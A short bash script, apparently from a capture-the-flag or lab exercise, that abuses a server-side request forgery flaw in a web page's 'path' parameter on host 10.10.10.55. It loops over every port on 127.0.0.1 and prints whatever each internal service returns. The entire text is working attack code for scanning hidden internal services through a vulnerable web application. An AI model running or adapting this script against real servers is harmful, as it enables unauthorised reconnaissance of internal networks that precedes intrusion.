for i in {0..65535}; do 
  res=$(curl -s http://10.10.10.55:60000/url.php?path=http%3A%2F%2F127.0.0.1%3A${i});
  len=$(echo $res | wc -w); 
  if [ "$len" -gt "0" ]; then
    echo -n "${i}: "; 
    echo $res | tr -d "\r" | head -1 | cut -c-100; 
  fi;
done
